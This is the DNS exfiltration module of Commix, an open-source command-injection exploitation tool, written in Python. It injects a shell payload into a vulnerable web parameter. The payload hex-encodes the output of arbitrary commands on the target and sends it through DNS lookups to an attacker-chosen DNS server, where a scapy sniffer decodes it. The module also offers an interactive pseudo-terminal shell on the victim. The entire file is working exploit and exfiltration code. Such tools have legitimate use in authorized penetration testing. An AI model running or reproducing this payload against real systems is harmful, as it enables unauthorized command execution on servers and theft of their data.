#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import time
import signal
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
import threading
from src.utils import menu
from src.utils import logs
from src.utils import common
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import parameters
from src.core.convert import hexdecode
from src.core.shells import reverse_tcp
from src.core.injections.controller import checks

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

"""
The DNS exfiltration technique: 
exfiltrate data using a user-defined DNS server [1].

[1] http://www.contextis.com/resources/blog/data-exfiltration-blind-os-command-injection/
"""

def querysniff(pkt):
  if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
    if ".xxx" in pkt.getlayer(DNS).qd.qname:
      print(hexdecode(pkt.getlayer(DNS).qd.qname.split(".xxx")[0]))

def signal_handler(signal, frame):
  os._exit(0)

def snif(dns_server):
  info_msg = "Started the sniffer between you and the DNS server '"
  info_msg += Style.BRIGHT + Fore.YELLOW + dns_server + Style.RESET_ALL + "'."
  print(settings.print_bold_info_msg(info_msg))
  while True:
    sniff(filter="port 53", prn=querysniff, store = 0)
 
def cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter):
  # DNS exfiltration payload.
  payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do host $line.xxx " + dns_server + "; done")
  
  # Check if defined "--verbose" option.
  if settings.VERBOSITY_LEVEL != 0:
    sys.stdout.write("\n" + settings.print_payload(payload))

  if not menu.options.data:
    url = url.replace(settings.INJECT_TAG, "")
    data = payload.replace(" ", "%20")
    request = url + data
  else:
    values =  {vuln_parameter:payload}
    data = _urllib.parse.urlencode(values).encode(settings.DEFAULT_CODEC)
    request = _urllib.request.Request(url=url, data=data)
    
  sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
  response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
  time.sleep(2)
  sys.stdout.write("\n" + Style.RESET_ALL)

def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):

  err_msg = ""
  if menu.enumeration_options():
    err_msg += "enumeration"
  if menu.file_access_options():
    if err_msg != "":
      err_msg = err_msg + " and "
    err_msg = err_msg + "file-access"

  if err_msg != "":
    warn_msg = "The " + err_msg + " options are not supported "
    warn_msg += "by this module because of the structure of the exfiltrated data. "
    warn_msg += "Please try using any unix-like commands manually."
    print(settings.print_warning_msg(warn_msg))
  
  # Pseudo-Terminal shell
  go_back = False
  go_back_again = False
  while True:
    if go_back == True:
      break
    if not menu.options.batch:  
      question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
      gotshell = _input(settings.print_question_msg(question_msg))
    else:
      gotshell = ""  
    if len(gotshell) == 0:
       gotshell= "Y"
    if gotshell in settings.CHOICE_YES:
      print("\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
      if settings.READLINE_ERROR:
        checks.no_readline_module()
      while True:
        try:
          if not settings.READLINE_ERROR:
            checks.tab_autocompleter()
          cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
          cmd = checks.escaped_cmd(cmd)
          if cmd.lower() in settings.SHELL_OPTIONS:
            if cmd.lower() == "quit" or cmd.lower() == "back":       
              print(settings.SINGLE_WHITESPACE)             
              os._exit(0)
            elif cmd.lower() == "?": 
              menu.os_shell_options()
            elif cmd.lower() == "os_shell": 
              warn_msg = "You are already into the '" + cmd.lower() + "' mode."
              print(settings.print_warning_msg(warn_msg))+ "\n"
            elif cmd.lower() == "reverse_tcp":
              warn_msg = "This option is not supported by this module."
              print(settings.print_warning_msg(warn_msg))+ "\n"
          else:
            # Command execution results.
            cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)

        except KeyboardInterrupt:
          print(settings.SINGLE_WHITESPACE)
          os._exit(0)
          
        except:
          print(settings.SINGLE_WHITESPACE)
          os._exit(0)

    elif gotshell in settings.CHOICE_NO:
      print(settings.SINGLE_WHITESPACE)
      os._exit(0)

    elif gotshell in settings.CHOICE_QUIT:
      print(settings.SINGLE_WHITESPACE)
      os._exit(0)

    else:
      err_msg = "'" + gotshell + "' is not a valid answer."
      print(settings.print_error_msg(err_msg))
      pass


def exploitation(dns_server, url, http_request_method, vuln_parameter, technique):
  # Check injection state
  settings.DETECTION_PHASE = False
  settings.EXPLOITATION_PHASE = True
  #signal.signal(signal.SIGINT, signal_handler)
  sniffer_thread = threading.Thread(target=snif, args=(dns_server, )).start()
  #time.sleep(2)
  if menu.options.os_cmd:
    cmd = menu.options.os_cmd
    cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)
    print(settings.SINGLE_WHITESPACE)
    os._exit(0)
  else:
    input_cmd(dns_server, http_request_method, url, vuln_parameter, technique)


def dns_exfiltration_handler(url, http_request_method):
  # Check injection state
  settings.DETECTION_PHASE = True
  settings.EXPLOITATION_PHASE = False
  # You need to have administrative privileges to run this module.
  if not common.running_as_admin():
    err_msg = "You need to have administrative privileges to run this module."
    print("\n" + settings.print_critical_msg(err_msg))
    os._exit(0)

  if not menu.options.data:
    #url = parameters.do_GET_check(url, http_request_method)
    vuln_parameter = parameters.vuln_GET_param(url)
    request = _urllib.request.Request(url)
    headers.do_check(request)
    
  else:
    parameter = menu.options.data
    parameter = _urllib.parse.unquote(parameter)
    parameter = parameters.do_POST_check(parameter, http_request_method)
    request = _urllib.request.Request(url, parameter)
    headers.do_check(request)
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
  
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      response = proxy.use_proxy(request)
    except _urllib.error.HTTPError as err_msg:
      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
        response = False  
      elif settings.IGNORE_ERR_MSG == False:
        err = str(err_msg) + "."
        print("\n" + settings.print_critical_msg(err))
        continue_tests = checks.continue_tests(err_msg)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      response = tor.use_tor(request)
    except _urllib.error.HTTPError as err_msg:
      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
        response = False  
      elif settings.IGNORE_ERR_MSG == False:
        err = str(err_msg) + "."
        print("\n" + settings.print_critical_msg(err))
        continue_tests = checks.continue_tests(err_msg)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  else:
    try:
      response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
    except _urllib.error.HTTPError as err_msg:
      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
        response = False  
      elif settings.IGNORE_ERR_MSG == False:
        err = str(err_msg) + "."
        print("\n" + settings.print_critical_msg(err))
        continue_tests = checks.continue_tests(err_msg)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  if settings.TARGET_OS == "win":
    err_msg = "This module's payloads are not suppoted by "
    err_msg += "the identified target operating system."
    print(settings.print_critical_msg(err_msg) + "\n")
    os._exit(0)

  else:
    dns_server = menu.options.dns_server
    technique = "DNS exfiltration module"
    info_msg = "Loading the " + technique + ". \n"
    sys.stdout.write(settings.print_info_msg(info_msg))
    exploitation(dns_server, url, http_request_method, vuln_parameter, technique)

if __name__ == "__main__":
  dns_exfiltration_handler(url, http_request_method)

# eof